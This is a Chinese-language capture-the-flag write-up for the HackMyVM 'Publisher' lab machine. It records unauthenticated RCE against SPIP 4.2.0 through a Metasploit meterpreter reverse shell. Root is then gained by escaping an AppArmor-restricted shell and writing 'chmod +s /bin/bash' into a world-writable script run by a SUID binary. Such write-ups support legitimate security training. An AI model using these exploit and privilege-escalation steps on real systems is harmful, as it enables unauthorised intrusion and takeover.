---
title: HMV publisher
published: 2025-03-05
pinned: false
description: HMV publisher，渗透，wp
tags: ['HMV']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-03-05
pubDate: 2025-03-05
---


## publisher

### 靶场链接
https://hackmyvm.eu/machines/machine.php?vm=Publisher

### 日常扫描
ip给了是 . . . 8

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -T4 -Pn -p- 192.168.31.8  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 20:46 HKT
Nmap scan report for 192.168.31.8
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Publisher's Pulse: SPIP Insights & Tips
MAC Address: 08:00:27:E4:F1:F5 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds

```

dirb和dirsearch都扫不出来什么东西，换gobuster试试
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.31.8/  -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.31.8/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.md         (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.md         (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 313] [--> http://192.168.31.8/images/]                                                                               
/index.html           (Status: 200) [Size: 8686]
/server-status        (Status: 403) [Size: 277]
/spip                 (Status: 301) [Size: 311] [--> http://192.168.31.8/spip/]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================

```

好东西，怪不得那么多佬喜欢这个，spip好像有一堆漏洞，看看版本
```
┌──(kali㉿kali)-[~]
└─$ whatweb http://192.168.31.8/spip/    
http://192.168.31.8/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.31.8], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://192.168.31.8/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache]

```

找一下
```
┌──(kali㉿kali)-[~]
└─$ searchsploit SPIP 4.2.0  
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
SPIP v4.2.0 - Remote Code Execution (Unauthen | php/webapps/51536.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results

```

### 漏洞利用

脚本报错，不知道为啥，msf启动

```
msf6 > search SPIP 4.2.0
[-] No results from search
msf6 > search SPIP 4.2

Matching Modules
================

   #   Name                                             Disclosure Date  Rank       Check  Description
   -   ----                                             ---------------  ----       -----  -----------
   0   exploit/multi/http/spip_bigup_unauth_rce         2024-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE                                
   1     \_ target: PHP In-Memory                       .                .          .      .
   2     \_ target: Unix/Linux Command Shell            .                .          .      .
   3     \_ target: Windows Command Shell               .                .          .      .
   4   exploit/multi/http/spip_porte_plume_previsu_rce  2024-08-16       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin                      
   5     \_ target: PHP In-Memory                       .                .          .      .
   6     \_ target: Unix/Linux Command Shell            .                .          .      .
   7     \_ target: Windows Command Shell               .                .          .      .
   8   exploit/multi/http/spip_rce_form                 2023-02-27       excellent  Yes    SPIP form PHP Injection                                              
   9     \_ target: PHP In-Memory                       .                .          .      .
   10    \_ target: Unix/Linux Command Shell            .                .          .      .
   11    \_ target: Windows Command Shell               .                .          .      .


Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/http/spip_rce_form                                                    
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell'                                                           

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/spip_bigup_unauth_rce) > show options

Module options (exploit/multi/http/spip_bigup_unauth_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FORM_PAGE  Auto             yes       A page with a form.
   Proxies                     no        A proxy chain of format type:host:por
                                         t[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.
                                         metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connec
                                         tions
   TARGETURI  /                yes       Path to Spip install
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.31.183   yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP In-Memory



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/spip_bigup_unauth_rce) > set RHOSTS http://192.168.31.8/spip/
RHOSTS => http://192.168.31.8/spip/
msf6 exploit(multi/http/spip_bigup_unauth_rce) > run

[*] Started reverse TCP handler on 192.168.31.183:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] SPIP version 4.2.0 is vulnerable.
[*] Bigup plugin version detected: 3.2.1
[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
[*] Found formulaire_action: login
[*] Found formulaire_action_args: CKNCtMYqq36vgfpnNEIK0...
[*] Preparing to send exploit payload to the target...
[*] Sending stage (40004 bytes) to 192.168.31.8
[*] Meterpreter session 1 opened (192.168.31.183:4444 -> 192.168.31.8:47312) at 2025-03-04 21:11:27 +0800

meterpreter > shell
Process 60 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
这玩意真好用啊我靠，第一个flag可以直接拿到的

### 提权

```
ls -la
total 48
drwxr-xr-x 8 think    think    4096 Feb 10  2024 .
drwxr-xr-x 1 root     root     4096 Dec  7  2023 ..
lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout
-rw-r--r-- 1 think    think    3771 Nov 14  2023 .bashrc
drwx------ 2 think    think    4096 Nov 14  2023 .cache
drwx------ 3 think    think    4096 Dec  8  2023 .config
drwx------ 3 think    think    4096 Feb 10  2024 .gnupg
drwxrwxr-x 3 think    think    4096 Jan 10  2024 .local
-rw-r--r-- 1 think    think     807 Nov 14  2023 .profile
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .python_history -> /dev/null
drwxr-xr-x 2 think    think    4096 Jan 10  2024 .ssh
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .viminfo -> /dev/null
drwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip
-rw-r--r-- 1 root     root       35 Feb 10  2024 user.txt

```

.ssh可以读，读密钥ssh上去

信息收集一下
```
think@publisher:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount

```

`/usr/sbin/run_container`这玩意有权限的，看看是什么，`cat`有乱码，`strings`看看
```
think@publisher:~$ strings /usr/sbin/run_container
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
execve
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
run_container.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__stack_chk_fail@@GLIBC_2.4
__libc_start_main@@GLIBC_2.2.5
execve@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment

```
看看`.sh`
```
think@publisher:~$ cat /opt/run_container.sh
cat: /opt/run_container.sh: Permission denied
think@publisher:~$ ls -la /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Mar 29  2024 /opt/run_container.sh
think@publisher:~$ ls -la /opt
ls: cannot open directory '/opt': Permission denied

```

哎nmd，运行一下
```
think@publisher:~$ /opt/run_container.sh
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied
docker: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/create": dial unix /var/run/docker.sock: connect: permission denied.
See 'docker run --help'.
List of Docker containers:
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied

Enter the ID of the container or leave blank to create a new one: 

```

啊这，这个玩意是docker的，还要输入一个id，该怎么办呢，不会了，这是easy难度啊我靠

按照作者思路，你先要发现这玩意你连上的不是bash
```
think@publisher:~$ env
SHELL=/usr/sbin/ash

```

所以我们要去生成一个`bash shell`，比如前面`/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash`

```
think@publisher:/usr/lib64$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Dec  8  2023 .
drwxr-xr-x 14 root root 4096 Feb 23  2022 ..
lrwxrwxrwx  1 root root   32 Nov 22  2023 ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.31.so  
```

权限是满的

```
think@publisher:/$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
think@publisher:/$ 
think@publisher:/$ echo '#!/bin/bash' > /opt/run_container.sh
think@publisher:/$ echo 'chmod +s /bin/bash' >> /opt/run_container.sh
think@publisher:/$ /usr/sbin/run_container
think@publisher:/$ cat /opt/run_container.sh
#!/bin/bash
chmod +s /bin/bash
think@publisher:/$ bash -p  
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
bash-5.0# 
ntainers: 
bash-5.0# 
```

### 为什么OPT不可以访问呢？
首先我们的`shell`是`ASH`

其次是`apparmor` 限制了，`apparmor` 可以对程序进行访问控制，靶机里就是限制呢我们的`shell` `ASH` ，下面是对ASH限制的配置文件
```
bash-5.0# cd /etc/apparmor.d/
bash-5.0# ls
abi           disable         local        nvidia_modprobe  tunables     usr.sbin.ash       usr.sbin.mysqld    usr.sbin.tcpdump
abstractions  force-complain  lsb_release  sbin.dhclient    usr.bin.man  usr.sbin.ippusbxd  usr.sbin.rsyslogd
bash-5.0# cat usr.sbin.ash 
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** rwx,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rwix,
}

```

可以看到是 `deny /opt/ r`  `deny /opt/** rwx`，限制了我们对`OPT`文件夹里边的文件的所有权限

因此我们通过动态链接库回到 `bash` 环境后，改配置文件就对我们不起效了